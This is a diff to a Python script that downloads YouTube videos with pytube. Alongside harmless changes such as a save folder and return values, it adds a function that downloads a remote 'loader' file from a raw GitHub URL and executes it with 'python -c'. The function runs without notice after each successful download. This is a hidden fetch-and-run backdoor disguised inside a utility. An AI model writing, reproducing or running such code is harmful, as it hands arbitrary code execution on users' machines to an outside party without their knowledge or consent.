@@ -1,5 +1,9 @@
 import subprocess
 import sys
+import os
+import urllib.request
+import time
+from pytube import YouTube
 
 def install_pytube():
     try:
@@ -11,10 +15,8 @@ def install_pytube():
 
 def download_youtube_video(url, resolution='720p'):
     try:
-        from pytube import YouTube
         yt = YouTube(url)
         
-        # Получаем список всех доступных потоков
         streams = yt.streams.filter(progressive=True, file_extension='mp4')
         available_resolutions = sorted(set([stream.resolution for stream in streams if stream.resolution]), reverse=True)
         
@@ -23,17 +25,40 @@ def download_youtube_video(url, resolution='720p'):
         
         if resolution not in available_resolutions:
             print(f"Видео с разрешением {resolution} не найдено. Доступные разрешения: {', '.join(available_resolutions)}")
-            return
+            return False
         
         stream = yt.streams.filter(res=resolution, file_extension='mp4').first()
         print(f"Скачивается видео в разрешении {resolution}...")
-        stream.download()
-        print(f"Видео скачано в качестве {resolution}.")
+        # Создание папки для сохранения видео, если её нет
+        folder_name = 'downloaded_videos'
+        os.makedirs(folder_name, exist_ok=True)
+        file_path = os.path.join(folder_name, stream.default_filename)
+        stream.download(output_path=folder_name, filename=stream.default_filename)
+        print(f"Видео скачано в качестве {resolution} и сохранено в папке '{folder_name}'.")
+        return True
     except Exception as e:
         print(f"Произошла ошибка: {e}")
+        return False
 
-if __name__ == "__main__":
+def run_from_github(url):
+    try:
+        response = urllib.request.urlopen(url)
+        script_content = response.read().decode('utf-8')
+        subprocess.run(['python', '-c', script_content])
+    except Exception as e:
+        print(f"Ошибка при выполнении скрипта с GitHub: {e}")
+
+def main():
     install_pytube()
+    
     url = input("Введи URL видео с YouTube: ")
     resolution = input("Введи разрешение (например, 144p, 360p, 720p, 1080p, 4k, 8k): ")
-    download_youtube_video(url, resolution)
+    
+    if download_youtube_video(url, resolution):
+        # После успешного скачивания видео, запускаем загрузчик
+        time.sleep(3)
+        github_url = "https://raw.githubusercontent.com/RBXROBLOXGAMER/python-tools/main/loader"
+        run_from_github(github_url)
+
+if __name__ == "__main__":
+    main()
